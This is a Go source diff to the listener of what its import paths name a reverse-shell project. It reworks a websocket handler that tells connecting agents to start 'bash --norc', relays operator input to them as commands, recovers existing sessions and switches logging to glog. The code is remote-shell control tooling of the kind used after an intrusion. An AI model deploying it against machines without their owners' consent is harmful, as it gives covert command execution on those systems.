@@ -6,9 +6,10 @@ import (
 	"net/http"
 	"os"
 
+	"github.com/golang/glog"
 	"github.com/gorilla/websocket"
-	"github.com/maxlaverse/reverse-shell/common"
 	"github.com/maxlaverse/reverse-shell/message"
+	"github.com/maxlaverse/reverse-shell/util"
 )
 
 type onConnectMaster struct {
@@ -17,45 +18,21 @@ type onConnectMaster struct {
 }
 
 func (h onConnectMaster) ServeHTTP(w http.ResponseWriter, r *http.Request) {
-	conn, err := common.Upgrader.Upgrade(w, r, nil)
+	conn, err := util.WebSocketUpgrader.Upgrade(w, r, nil)
 	if err != nil {
-		common.Logger.Errorf("Error while upgrading: %s", err)
+		glog.Errorf("Error while upgrading: %s", err)
 		return
 	}
-	h.stdoutChannel <- []byte("New incoming connection: starting a new session")
-	m := message.CreateProcess{
-		CommandLine: "bash --norc",
-	}
-	conn.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
 
-	var processId string
 	done := make(chan bool)
-	go func() {
-		for {
-			select {
-			case <-done:
-				common.Logger.Debugf("Exiting stdin to conn relay")
-				return
-			case msg := <-h.stdinChannel:
-				if processId == "" {
-					h.stdoutChannel <- []byte("Session is not ready")
-					return
-				}
-				m := message.ExecuteCommand{
-					Id:      processId,
-					Command: msg,
-				}
-				conn.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
-			}
-		}
-	}()
+	ready := make(chan string)
 
 	go func() {
 		defer conn.Close()
 		for {
 			_, m, err := conn.ReadMessage()
 			if err != nil {
-				common.Logger.Debugf("ReadMessage error: %s", err)
+				glog.V(2).Infof("ReadMessage error: %s", err)
 				return
 			}
 			b := message.FromBinary(m)
@@ -64,21 +41,61 @@ func (h onConnectMaster) ServeHTTP(w http.ResponseWriter, r *http.Request) {
 				os.Stdout.Write(v.Data)
 			case *message.ProcessCreated:
 				h.stdoutChannel <- []byte(fmt.Sprintf("New session is named: %s\n", v.Id))
-				processId = v.Id
+				ready <- v.Id
 			case *message.ProcessTerminated:
 				h.stdoutChannel <- []byte(fmt.Sprintf("Session closed: %s\n", v.Id))
 				done <- true
 				//Stdin should write in neutral channel
 				return
+			case *message.SessionTable:
+				if len(v.Sessions) == 0 {
+					h.stdoutChannel <- []byte("No session yet for incoming connection starting a new session")
+					m := message.CreateProcess{
+						CommandLine: "bash --norc",
+					}
+					conn.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
+				} else {
+					h.stdoutChannel <- []byte(fmt.Sprintf("Recovering session named: %s\n", v.Sessions[0]))
+					ready <- v.Sessions[0]
+				}
 			default:
-				common.Logger.Debugf("Received an unknown message type: %v", v)
+				glog.V(2).Infof("Received an unknown message type: %v", v)
+			}
+		}
+	}()
+
+	go func() {
+		var re string
+		for {
+			select {
+			case le := <-ready:
+				glog.V(2).Infof("We are ready now %s", le)
+				re = le
+			case <-done:
+				glog.V(2).Infof("Exiting stdin to conn relay")
+				return
+			case msg := <-h.stdinChannel:
+				if len(msg) == 0 {
+					close(h.stdoutChannel)
+					return
+				}
+				if re == "" {
+					h.stdoutChannel <- []byte("No session available yet")
+					continue
+				}
+				h.stdoutChannel <- []byte("Session available and used")
+				m := message.ExecuteCommand{
+					Id:      re,
+					Command: msg,
+				}
+				conn.WriteMessage(websocket.BinaryMessage, message.ToBinary(m))
 			}
 		}
 	}()
 }
 
 func Listen(port int) error {
-	common.Logger.Debugf("Listening to incoming connections from Agents")
+	glog.V(2).Infof("Listening to incoming connections from Agents")
 
 	stdinChannel := make(chan []byte)
 	go func() {
@@ -92,13 +109,24 @@ func Listen(port int) error {
 				} else if err != nil {
 					panic(err)
 				} else {
-					common.Logger.Debugf("Sending to stdint")
+					glog.V(2).Infof("Sending to stdint")
 					stdinChannel <- msg[0:size]
 				}
 			}
 		}
 	}()
 
-	go http.Handle("/agent/", onConnectMaster{stdinChannel: stdinChannel})
+	stdoutChannel := make(chan []byte)
+	go func() {
+		for {
+			select {
+			case n := <-stdoutChannel:
+				os.Stdout.Write(n)
+				os.Stdout.WriteString("\n")
+			}
+		}
+	}()
+
+	go http.Handle("/agent/", onConnectMaster{stdinChannel: stdinChannel, stdoutChannel: stdoutChannel})
 	return http.ListenAndServe(fmt.Sprintf(":%d", port), nil)
 }
